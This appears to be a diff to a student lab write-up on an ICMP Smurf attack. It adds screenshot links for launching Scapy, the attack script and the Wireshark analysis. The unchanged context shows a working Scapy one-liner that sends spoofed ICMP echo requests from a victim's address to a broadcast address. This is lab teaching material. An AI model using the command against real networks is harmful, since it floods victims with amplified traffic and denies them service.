@@ -23,17 +23,20 @@ while spoofing the victim's IP address, causing traffic amplification.
 ``` bash
 sudo scapy
 ```
-
+![Scapy lunching](../images/scapy-launch.png)
 ### b. ICMP Smurf attack script
 
 ``` python
 send(IP(src="192.168.43.22", dst="192.168.43.255")/ICMP(), count=100)
 ```
+![smurf details](../images/smurf-script.png)
 
 ### c. Traffic analysis with Wireshark
 
 Wireshark shows ICMP Echo Requests sent to the broadcast address and
 multiple replies sent to the victim.
+
+![wireshark analysis](../images/smurf-wireshark.png)
 
 ## 4. Impact of the Attack
 
